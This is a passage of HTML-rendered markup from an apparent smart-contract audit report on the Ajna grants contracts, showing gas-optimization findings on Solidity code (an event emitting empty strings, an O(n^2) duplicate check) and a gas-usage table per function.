class=\"mtk7\">393</span><span class=\"mtk1\">:        </span><span class=\"mtk12\">emit</span><span class=\"mtk1\"> </span><span class=\"mtk11\">ProposalCreated</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">394</span><span class=\"mtk1\">:            </span><span class=\"mtk12\">proposalId_</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">395</span><span class=\"mtk1\">:            </span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">396</span><span class=\"mtk1\">:            </span><span class=\"mtk12\">targets_</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">397</span><span class=\"mtk1\">:            </span><span class=\"mtk12\">values_</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">398</span><span class=\"mtk1\">:            </span><span class=\"mtk4\">new</span><span class=\"mtk1\"> </span><span class=\"mtk10\">string</span><span class=\"mtk1\">[](</span><span class=\"mtk12\">targets_</span><span class=\"mtk1\">.</span><span class=\"mtk12\">length</span><span class=\"mtk1\">), </span><span class=\"mtk3\">// @audit: no data is emitted</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">399</span><span class=\"mtk1\">:            </span><span class=\"mtk12\">calldatas_</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">400</span><span class=\"mtk1\">:            </span><span class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span class=\"mtk12\">number</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">401</span><span class=\"mtk1\">:            </span><span class=\"mtk12\">currentDistribution</span><span class=\"mtk1\">.</span><span class=\"mtk12\">endBlock</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">402</span><span class=\"mtk1\">:            </span><span class=\"mtk12\">description_</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">403</span><span class=\"mtk1\">:        );</span></span></span></code></pre>\n<h2 id=\"g-13-sort-array-offchain-to-check-duplicates-in-on-instead-of-on2\" style=\"position:relative;\"><a href=\"#g-13-sort-array-offchain-to-check-duplicates-in-on-instead-of-on2\" aria-label=\"g 13 sort array offchain to check duplicates in on instead of on2 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G-13] Sort array offchain to check duplicates in O(n) instead of O(n^2)</h2>\n<p>Instead of using two for loops to check for duplicates, which runs in O(n^2) time and is expensive, the <code>proposalIds_</code> array can be sorted offchain which allows us to to check duplicates by simply ensuring the the current <code>id</code> is larger than the previous one (O(n) time).</p>\n<p><a href=\"https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-grants/src/grants/base/StandardFunding.sol#L463-L479\">https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-grants/src/grants/base/StandardFunding.sol#L463-L479</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"222\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">ajna</span><span class=\"mtk1\">-</span><span class=\"mtk12\">grants</span><span class=\"mtk1\">/</span><span class=\"mtk12\">src</span><span class=\"mtk1\">/</span><span class=\"mtk12\">base</span><span class=\"mtk1\">/</span><span class=\"mtk12\">StandardFunding</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">463</span><span class=\"mtk1\">:    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">_hasDuplicates</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">464:        </span><span class=\"mtk10\">uint256</span><span class=\"mtk1\">[] </span><span class=\"mtk10\">calldata</span><span class=\"mtk1\"> </span><span class=\"mtk10\">proposalIds_</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">465</span><span class=\"mtk1\">:    ) </span><span class=\"mtk11\">internal</span><span class=\"mtk1\"> </span><span class=\"mtk11\">pure</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">bool</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">466</span><span class=\"mtk1\">:        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">numProposals</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">proposalIds_</span><span class=\"mtk1\">.</span><span class=\"mtk12\">length</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">467</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">468</span><span class=\"mtk1\">:        </span><span class=\"mtk15\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">0</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">numProposals</span><span class=\"mtk1\">; ) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">469</span><span class=\"mtk1\">:            </span><span class=\"mtk15\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">j</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> + </span><span class=\"mtk7\">1</span><span class=\"mtk1\">; </span><span class=\"mtk12\">j</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">numProposals</span><span class=\"mtk1\">; ) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">470</span><span class=\"mtk1\">:                </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">proposalIds_</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">] == </span><span class=\"mtk12\">proposalIds_</span><span class=\"mtk1\">[</span><span class=\"mtk12\">j</span><span class=\"mtk1\">]) </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> </span><span class=\"mtk4\">true</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">471</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">472</span><span class=\"mtk1\">:                </span><span class=\"mtk12\">unchecked</span><span class=\"mtk1\"> { ++</span><span class=\"mtk12\">j</span><span class=\"mtk1\">; }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">473</span><span class=\"mtk1\">:            }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">474</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">475</span><span class=\"mtk1\">:            </span><span class=\"mtk12\">unchecked</span><span class=\"mtk1\"> { ++</span><span class=\"mtk12\">i</span><span class=\"mtk1\">; }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">476</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">477</span><span class=\"mtk1\">:        }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">478</span><span class=\"mtk1\">:        </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> </span><span class=\"mtk4\">false</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">479</span><span class=\"mtk1\">:    }</span></span></span></code></pre>\n<h2 id=\"gasreport-output-with-all-optimizations-applied\" style=\"position:relative;\"><a href=\"#gasreport-output-with-all-optimizations-applied\" aria-label=\"gasreport output with all optimizations applied permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><code>GasReport</code> output with all optimizations applied</h2>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"js\" data-index=\"223\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">| </span><span class=\"mtk12\">src</span><span class=\"mtk1\">/</span><span class=\"mtk12\">grants</span><span class=\"mtk1\">/</span><span class=\"mtk12\">GrantFund</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span><span class=\"mtk12\">GrantFund</span><span class=\"mtk1\"> </span><span class=\"mtk12\">contract</span><span class=\"mtk1\"> |                 |        |        |        |         |</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">|---------------------------------------------|-----------------|--------|--------|--------|---------|</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">| </span><span class=\"mtk12\">Deployment</span><span class=\"mtk1\"> </span><span class=\"mtk12\">Cost</span><span class=\"mtk1\">                             | </span><span class=\"mtk12\">Deployment</span><span class=\"mtk1\"> </span><span class=\"mtk12\">Size</span><span class=\"mtk1\"> |        |        |        |         |</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">| </span><span class=\"mtk7\">4584527</span><span class=\"mtk1\">                                     | </span><span class=\"mtk7\">22888</span><span class=\"mtk1\">           |        |        |        |         |</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">| </span><span class=\"mtk10\">Function</span><span class=\"mtk1\"> </span><span class=\"mtk12\">Name</span><span class=\"mtk1\">                               | </span><span class=\"mtk12\">min</span><span class=\"mtk1\">             | </span><span class=\"mtk12\">avg</span><span class=\"mtk1\">    | </span><span class=\"mtk12\">median</span><span class=\"mtk1\"> | </span><span class=\"mtk12\">max</span><span class=\"mtk1\">    | # </span><span class=\"mtk12\">calls</span><span class=\"mtk1\"> |</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">| </span><span class=\"mtk12\">claimDelegateReward</span><span class=\"mtk1\">                         | </span><span class=\"mtk7\">1027</span><span class=\"mtk1\">            | </span><span class=\"mtk7\">34814</span><span class=\"mtk1\">  | </span><span class=\"mtk7\">35468</span><span class=\"mtk1\">  | </span><span class=\"mtk7\">42268</span><span class=\"mtk1\">  | </span><span class=\"mtk7\">237</span><span class=\"mtk1\">     |</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">| </span><span class=\"mtk12\">executeExtraordinary</span><span class=\"mtk1\">                        | </span><span class=\"mtk7\">7234</span><span class=\"mtk1\">            | </span><span class=\"mtk7\">38968</span><span class=\"mtk1\">  | </span><span class=\"mtk7\">39686</span><span class=\"mtk1\">  | </span><span class=\"mtk7\">95707</span><span class=\"mtk1\">  | </span><span class=\"mtk7\">11</span><span class=\"mtk1\">      |</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">| </span><span class=\"mtk12\">executeStandard</span><span class=\"mtk1\">                             | </span><span class=\"mtk7\">8598</span><span class=\"mtk1\">            | </span><span class=\"mtk7\">29854</span><span class=\"mtk1\">  | </span><span class=\"mtk7\">37920</span><span class=\"mtk1\">  | </span><span class=\"mtk7\">47520</span><span class=\"mtk1\">  | </span><span class=\"mtk7\">8</span><span class=\"mtk1\">       |</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">| </span><span class=\"mtk12\">findMechanismOfProposal</span><span class=\"mtk1\">                     | </span><span class=\"mtk7\">613</span><span class=\"mtk1\">             | </span><span class=\"mtk7\">2043</span><span class=\"mtk1\">   | </span><span class=\"mtk7\">799</span><span class=\"mtk1\">    | </span><span class=\"mtk7\">4719</span><span class=\"mtk1\">   | </span><span class=\"mtk7\">3</span><span class=\"mtk1\">       |</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">| </span><span class=\"mtk12\">fundTreasury</span><span class=\"mtk1\">                                | </span><span class=\"mtk7\">7917</span><span class=\"mtk1\">            | </span><span class=\"mtk7\">45019</span><span class=\"mtk1\">  | </span><span class=\"mtk7\">44557</span><span class=\"mtk1\">  | </span><span class=\"mtk7\">65788</span><span class=\"mtk1\">  | </span><span class=\"mtk7\">29</span><span class=\"mtk1\">      |</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">| </span><span class=\"mtk12\">fundingVote</span><span class=\"mtk1\">                                 | </span><span class=\"mtk7\">1162</span><span class=\"mtk1\">            | </span><span class=\"mtk7\">104626</span><span class=\"mtk1\"> | </span><span class=\"mtk7\">104616</span><span class=\"mtk1\"> | </span><span class=\"mtk7\">396776</span><span class=\"mtk1\"> | </span><span class=\"mtk7\">252</span><span class=\"mtk1\">     |</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">| </span><span class=\"mtk12\">getDelegateReward</span><span class=\"mtk1\">                           | </span><span class=\"mtk7\">1909</span><span class=\"mtk1\">            | </span><span class=\"mtk7\">1909</span><span class=\"mtk1\">   | </span><span class=\"mtk7\">1909</span><span class=\"mtk1\">   | </span><span class=\"mtk7\">1909</span><span class=\"mtk1\">   | </span><span class=\"mtk7\">5</span><span class=\"mtk1\">       |</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">| </span><span class=\"mtk12\">getDistributionId</span><span class=\"mtk1\">                           | </span><span class=\"mtk7\">368</span><span class=\"mtk1\">             | </span><span class=\"mtk7\">417</span><span class=\"mtk1\">    | </span><span class=\"mtk7\">368</span><span class=\"mtk1\">    | </span><span class=\"mtk7\">2368</span><span class=\"mtk1\">   | </span><span class=\"mtk7\">601</span><span class=\"mtk1\">     |</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">| </span><span class=\"mtk12\">getDistributionPeriodInfo</span><span class=\"mtk1\">                   | </span><span class=\"mtk7\">1023</span><span class=\"mtk1\">            | </span><span class=\"mtk7\">1802</span><span class=\"mtk1\">   | </span><span class=\"mtk7\">1023</span><span class=\"mtk1\">   | </span><span class=\"mtk7\">5023</span><span class=\"mtk1\">   | </span><span class=\"mtk7\">77</span><span class=\"mtk1\">      |</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">| </span><span class=\"mtk12\">getExtraordinaryProposalInfo</span><span class=\"mtk1\">                | </span><span class=\"mtk7\">992</span><span class=\"mtk1\">             | </span><span class=\"mtk7\">992</span><span class=\"mtk1\">    | </span><span class=\"mtk7\">992</span><span class=\"mtk1\">    | </span><span class=\"mtk7\">992</span><span class=\"mtk1\">    | </span><span class=\"mtk7\">4</span><span class=\"mtk1\">       |</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">| </span><span class=\"mtk12\">getExtraordinaryProposalSucceeded</span><span class=\"mtk1\">           | </span><span class=\"mtk7\">2245</span><span class=\"mtk1\">            | </span><span class=\"mtk7\">2664</span><span class=\"mtk1\">   | </span><span class=\"mtk7\">2740</span><span class=\"mtk1\">   | </span><span class=\"mtk7\">3008</span><span class=\"mtk1\">   | </span><span class=\"mtk7\">3</span><span class=\"mtk1\">       |</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">| </span><span class=\"mtk12\">getFundedProposalSlate</span><span class=\"mtk1\">                      | </span><span class=\"mtk7\">1155</span><span class=\"mtk1\">            | </span><span class=\"mtk7\">1331</span><span class=\"mtk1\">   | </span><span class=\"mtk7\">1390</span><span class=\"mtk1\">   | </span><span class=\"mtk7\">1390</span><span class=\"mtk1\">   | </span><span class=\"mtk7\">4</span><span class=\"mtk1\">       |</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">| </span><span class=\"mtk12\">getFundingPowerVotes</span><span class=\"mtk1\">                        | </span><span class=\"mtk7\">15522</span><span class=\"mtk1\">           | </span><span class=\"mtk7\">15710</span><span class=\"mtk1\">  | </span><span class=\"mtk7\">15773</span><span class=\"mtk1\">  | </span><span class=\"mtk7\">15773</span><span class=\"mtk1\">  | </span><span class=\"mtk7\">4</span><span class=\"mtk1\">       |</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">| </span><span class=\"mtk12\">getFundingVotesCast</span><span class=\"mtk1\">                         | </span><span class=\"mtk7\">1576</span><span class=\"mtk1\">            | </span><span class=\"mtk7\">2316</span><span class=\"mtk1\">   | </span><span class=\"mtk7\">2316</span><span class=\"mtk1\">   | </span><span class=\"mtk7\">3056</span><span class=\"mtk1\">   | </span><span class=\"mtk7\">2</span><span class=\"mtk1\">       |</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">| </span><span class=\"mtk12\">getMinimumThresholdPercentage</span><span class=\"mtk1\">               | </span><span class=\"mtk7\">471</span><span class=\"mtk1\">             | </span><span class=\"mtk7\">629</span><span class=\"mtk1\">    | </span><span class=\"mtk7\">471</span><span class=\"mtk1\">    | </span><span class=\"mtk7\">2471</span><span class=\"mtk1\">   | </span><span class=\"mtk7\">16</span><span class=\"mtk1\">      |</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">| </span><span class=\"mtk12\">getProposalInfo</span><span class=\"mtk1\">                             | </span><span class=\"mtk7\">1002</span><span class=\"mtk1\">            | </span><span class=\"mtk7\">1002</span><span class=\"mtk1\">   | </span><span class=\"mtk7\">1002</span><span class=\"mtk1\">   | </span><span class=\"mtk7\">1002</span><span class=\"mtk1\">   | </span><span class=\"mtk7\">110</span><span class=\"mtk1\">     |</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">| </span><span class=\"mtk12\">getSlateHash</span><span class=\"mtk1\">                                | </span><span class=\"mtk7\">922</span><span class=\"mtk1\">             | </span><span class=\"mtk7\">930</span><span class=\"mtk1\">    | </span><span class=\"mtk7\">934</span><span class=\"mtk1\">    | </span><span class=\"mtk7\">934</span><span class=\"mtk1\">    | </span><span class=\"mtk7\">3</span><span class=\"mtk1\">       |</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">| </span><span class=\"mtk12\">getSliceOfNonTreasury</span><span class=\"mtk1\">                       | </span><span class=\"mtk7\">1577</span><span class=\"mtk1\">            | </span><span class=\"mtk7\">3743</span><span class=\"mtk1\">   | </span><span class=\"mtk7\">1577</span><span class=\"mtk1\">   | </span><span class=\"mtk7\">8077</span><span class=\"mtk1\">   | </span><span class=\"mtk7\">3</span><span class=\"mtk1\">       |</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">| </span><span class=\"mtk12\">getSliceOfTreasury</span><span class=\"mtk1\">                          | </span><span class=\"mtk7\">781</span><span class=\"mtk1\">             | </span><span class=\"mtk7\">1781</span><span class=\"mtk1\">   | </span><span class=\"mtk7\">1781</span><span class=\"mtk1\">   | </span><span class=\"mtk7\">2781</span><span class=\"mtk1\">   | </span><span class=\"mtk7\">2</span><span class=\"mtk1\">       |</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">| </span><span class=\"mtk12\">getTopTenProposals</span><span class=\"mtk1\">                          | </span><span class=\"mtk7\">1209</span><span class=\"mtk1\">            | </span><span class=\"mtk7\">2473</span><span class=\"mtk1\">   | </span><span class=\"mtk7\">2385</span><span class=\"mtk1\">   | </span><span class=\"mtk7\">3326</span><span class=\"mtk1\">   | </span><span class=\"mtk7\">16</span><span class=\"mtk1\">      |</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">| </span><span class=\"mtk12\">getVoterInfo</span><span class=\"mtk1\">                                | </span><span class=\"mtk7\">1002</span><span class=\"mtk1\">            | </span><span class=\"mtk7\">1002</span><span class=\"mtk1\">   | </span><span class=\"mtk7\">1002</span><span class=\"mtk1\">   | </span><span class=\"mtk7\">1002</span><span class=\"mtk1\">   | </span><span class=\"mtk7\">5</span><span class=\"mtk1\">       |</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">| </span><span class=\"mtk12\">getVotesExtraordinary</span><span class=\"mtk1\">                       | </span><span class=\"mtk7\">764</span><span class=\"mtk1\">             | </span><span class=\"mtk7\">7180</span><span class=\"mtk1\">   | </span><span class=\"mtk7\">7192</span><span class=\"mtk1\">   | </span><span class=\"mtk7\">8334</span><span class=\"mtk1\">   | </span><span class=\"mtk7\">880</span><span class=\"mtk1\">     |</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">| </span><span class=\"mtk12\">getVotesFunding</span><span class=\"mtk1\">                             | </span><span class=\"mtk7\">1250</span><span class=\"mtk1\">            | </span><span class=\"mtk7\">4511</span><span class=\"mtk1\">   | </span><span class=\"mtk7\">1250</span><span class=\"mtk1\">   | </span><span class=\"mtk7\">8366</span><span class=\"mtk1\">   | </span><span class=\"mtk7\">15</span><span class=\"mtk1\">      |</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">| </span><span class=\"mtk12\">getVotesScreening</span><span class=\"mtk1\">                           | </span><span class=\"mtk7\">4892</span><span class=\"mtk1\">            | </span><span class=\"mtk7\">4934</span><span class=\"mtk1\">   | </span><span class=\"mtk7\">4926</span><span class=\"mtk1\">   | </span><span class=\"mtk7\">6068</span><span class=\"mtk1\">   | </span><span class=\"mtk7\">489</span><span class=\"mtk1\">     |</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">| </span><span class=\"mtk12\">hasVotedExtraordinary</span><span class=\"mtk1\">                       | </span><span class=\"mtk7\">683</span><span class=\"mtk1\">             | </span><span class=\"mtk7\">1683</span><span class=\"mtk1\">   | </span><span class=\"mtk7\">1683</span><span class=\"mtk1\">   | </span><span class=\"mtk7\">2683</span><span class=\"mtk1\">   | </span><span class=\"mtk7\">2</span><span class=\"mtk1\">       |</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">| </span><span class=\"mtk12\">hashProposal</span><span class=\"mtk1\">                                | </span><span class=\"mtk7\">3685</span><span class=\"mtk1\">            | </span><span class=\"mtk7\">3685</span><span class=\"mtk1\">   | </span><span class=\"mtk7\">3685</span><span class=\"mtk1\">   | </span><span class=\"mtk7\">3685</span><span class=\"mtk1\">   | </span><span class=\"mtk7\">76</span><span class=\"mtk1\">      |</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">| </span><span class=\"mtk12\">proposeExtraordinary</span><span class=\"mtk1\">                        | </span><span class=\"mtk7\">4725</span><span class=\"mtk1\">            | </span><span class=\"mtk7\">63262</span><span class=\"mtk1\">  | </span><span class=\"mtk7\">82112</span><span class=\"mtk1\">  | </span><span class=\"mtk7\">86451</span><span class=\"mtk1\">  | </span><span class=\"mtk7\">18</span><span class=\"mtk1\">      |</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">| </span><span class=\"mtk12\">proposeStandard</span><span class=\"mtk1\">                             | </span><span class=\"mtk7\">4418</span><span class=\"mtk1\">            | </span><span class=\"mtk7\">77911</span><span class=\"mtk1\">  | </span><span class=\"mtk7\">82820</span><span class=\"mtk1\">  | </span><span class=\"mtk7\">82820</span><span class=\"mtk1\">  | </span><span class=\"mtk7\">72</span><span class=\"mtk1\">      |</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">| </span><span class=\"mtk12\">screeningVote</span><span class=\"mtk1\">                               | </span><span class=\"mtk7\">1456</span><span class=\"mtk1\">            | </span><span class=\"mtk7\">44406</span><span class=\"mtk1\">  | </span><span class=\"mtk7\">38748</span><span class=\"mtk1\">  | </span><span class=\"mtk7\">390626</span><span class=\"mtk1\"> | </span><span class=\"mtk7\">271</span><span class=\"mtk1\">     |</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">| </span><span class=\"mtk12\">screeningVotesCast</span><span class=\"mtk1\">                          | </span><span class=\"mtk7\">695</span><span class=\"mtk1\">             | </span><span class=\"mtk7\">1361</span><span class=\"mtk1\">   | </span><span class=\"mtk7\">695</span><span class=\"mtk1\">    | </span><span class=\"mtk7\">2695</span><span class=\"mtk1\">   | </span><span class=\"mtk7\">3</span><span class=\"mtk1\">       |</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">| </span><span class=\"mtk12\">startNewDistributionPeriod</span><span class=\"mtk1\">                  | </span><span class=\"mtk7\">576</span><span class=\"mtk1\">             | </span><span class=\"mtk7\">48177</span><span class=\"mtk1\">  | </span><span class=\"mtk7\">52813</span><span class=\"mtk1\">  | </span><span class=\"mtk7\">75139</span><span class=\"mtk1\">  | </span><span class=\"mtk7\">20</span><span class=\"mtk1\">      |</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">| </span><span class=\"mtk12\">state</span><span class=\"mtk1\">                                       | </span><span class=\"mtk7\">1337</span><span class=\"mtk1\">            | </span><span class=\"mtk7\">4346</span><span class=\"mtk1\">   | </span><span class=\"mtk7\">3685</span><span class=\"mtk1\">   | </span><span class=\"mtk7\">7137</span><span class=\"mtk1\">   | </span><span class=\"mtk7\">20</span><span class=\"mtk1\">      |</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">| </span><span class=\"mtk12\">treasury</span><span class=\"mtk1\">                                    | </span><span class=\"mtk7\">396</span><span class=\"mtk1\">             | </span><span class=\"mtk7\">396</span><span class=\"mtk1\">    | </span><span class=\"mtk7\">396</span><span class=\"mtk1\">    | </span><span class=\"mtk7\">396</span><span class=\"mtk1\">    | </span><span class=\"mtk7\">12</span><span class=\"mtk1\">      |</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">| </span><span class=\"mtk12\">updateSlate</span><span class=\"mtk1\">                                 | </span><span class=\"mtk7\">971</span><span class=\"mtk1\">             | </span><span class=\"mtk7\">57418</span><span class=\"mtk1\">  | </span><span class=\"mtk7\">69517</span><span class=\"mtk1\">  | </span><span class=\"mtk7\">310231</span><span class=\"mtk1\"> | </span><span class=\"mtk7\">17</span><span class=\"mtk1\">      |</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">| </span><span class=\"mtk12\">voteExtraordinary</span><span class=\"mtk1\">                           | </span><span class=\"mtk7\">590</span><span class=\"mtk1\">             | </span><span class=\"mtk7\">28832</span><span class=\"mtk1\">  | </span><span class=\"mtk7\">28927</span><span class=\"mtk1\">  | </span><span class=\"mtk7\">30893</span><span class=\"mtk1\">  | </span><span class=\"mtk7\">877</span><span class=\"mtk1\">     |</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">| </span><span class=\"mtk12\">src</span><span class=\"mtk1\">/</span><span class=\"mtk12\">PositionManager</span><span 